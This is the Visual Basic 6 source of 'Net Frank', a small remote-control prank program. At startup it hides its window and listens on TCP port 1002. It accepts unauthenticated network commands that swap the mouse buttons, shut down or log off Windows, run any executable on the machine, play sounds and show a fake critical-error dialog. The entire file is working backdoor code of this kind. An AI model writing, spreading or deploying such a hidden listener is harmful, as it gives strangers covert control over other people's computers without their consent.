VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frm_main 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Net Frank"
   ClientHeight    =   4755
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   7230
   Icon            =   "frm_main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4755
   ScaleWidth      =   7230
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame frm_log 
      Caption         =   "Event Log"
      Height          =   4755
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   7215
      Begin MSWinsockLib.Winsock win_frank 
         Index           =   0
         Left            =   120
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.ListBox lst_events 
         BackColor       =   &H00400000&
         BeginProperty Font 
            Name            =   "Arial Narrow"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FFFF&
         Height          =   4380
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   6975
      End
   End
End
Attribute VB_Name = "frm_main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'************
'VARIABLES
    Private max_frank As Long
    Dim logit As Boolean
    Dim echoit As Boolean
'************
'API COMMANDS
    Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
    Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
    Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
'************

Private Sub Form_Load()
    max_frank = 0
    win_frank(0).LocalPort = 1002
    win_frank(0).Listen
    frm_main.Hide
End Sub

Private Sub win_frank_ConnectionRequest(Index As Integer, ByVal requestID As Long)
    If Index = 0 Then
        max_frank = max_frank + 1
        Load win_frank(max_frank)
        win_frank(max_frank).LocalPort = 0
        win_frank(max_frank).Accept requestID
    End If
End Sub

Private Sub execute_command(Index As Integer, command As String)
    Dim success As Boolean
    Dim error As String
    Dim fs
    Dim header As String
    Dim variables As String
    Dim start_pos As Integer
    Dim end_pos As Integer
    header = Left(command, 3)
    
    logit = True
    echoit = True
    
    Select Case header
        Case Is = "nfb"
            start_pos = InStr(1, command, """", vbTextCompare)
            end_pos = InStr(start_pos + 1, command, """", vbTextCompare)
            If end_pos Then
                variables = Mid(command, start_pos + 1, end_pos - (start_pos + 1))
                If Val(variables) >= 0 And Val(variables) <= 1 Then
                    SwapMouseButton Val(variables)
                    success = True
                Else
                    error = "Invalid parameter"
                End If
            Else
                error = "Usage: nfb ""0/1"""
            End If
        Case Is = "nfe"
            ExitWindowsEx 0, 0
            success = True
        Case Is = "nfh"
            frm_main.Hide
            success = True
        Case Is = "nfp"
            start_pos = InStr(1, command, """", vbTextCompare)
            end_pos = InStr(start_pos + 1, command, """", vbTextCompare)
            If end_pos Then
                variables = Mid(command, start_pos + 1, end_pos - (start_pos + 1))
                If InStr(1, variables, ".wav", vbTextCompare) Then
                    If verify_file(variables) = True Then
                        sndPlaySound variables, 1
                        success = True
                    Else
                        error = "File not found"
                    End If
                Else
                    error = "Not a wave file"
                End If
            Else
                error = "Usage: nfp ""wave file"""
            End If
        Case Is = "nfr"
            start_pos = InStr(1, command, """", vbTextCompare)
            end_pos = InStr(start_pos + 1, command, """", vbTextCompare)
            If end_pos Then
                variables = Mid(command, start_pos + 1, end_pos - (start_pos + 1))
                If InStr(1, variables, ".exe", vbTextCompare) Then
                    If verify_file(variables) = True Then
                        Shell variables, vbNormalFocus
                        success = True
                    Else
                        error = "File not found"
                    End If
                Else
                    error = "Not an executable"
                End If
            Else
                error = "Usage: nfr ""executable"""
            End If
        Case Is = "nfm"
            start_pos = InStr(1, command, """", vbTextCompare)
            end_pos = InStr(start_pos + 1, command, """", vbTextCompare)
            If end_pos Then
                variables = Mid(command, start_pos + 1, end_pos - (start_pos + 1))
                MsgBox variables, vbCritical, "Win32 API Critical Error"
                success = True
            Else
                error = "Usage: nfm ""message"""
            End If
        Case Is = "nfs"
            frm_main.Show
            success = True
        Case Is = "ver"
            win_frank(Index).SendData "Net Frank, version " & App.Major & "." & App.Minor
            success = True
            echoit = False
        Case Else
            error = "Unknown command"
            success = False
    End Select
    
    If success = True Then
        If logit = True Then lst_events.AddItem win_frank(Index).RemoteHostIP & " COMMAND - " & command & " @ " & Time & "-" & Date
        If echoit = True Then win_frank(Index).SendData " " & command & " @ " & Time & "-" & Date
    Else
        If logit = True Then lst_events.AddItem win_frank(Index).RemoteHostIP & " ERROR - " & error
        If echoit = True Then win_frank(Index).SendData " " & error
    End If
End Sub

Private Function verify_file(i_filename As String) As Boolean
    Set fs = CreateObject("Scripting.FileSystemObject")
    If fs.fileexists(i_filename) Then
        verify_file = True
    Else
        verify_file = False
    End If
End Function

Private Sub win_frank_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    Dim net_data As String
    win_frank(Index).GetData net_data
    execute_command Index, net_data
End Sub
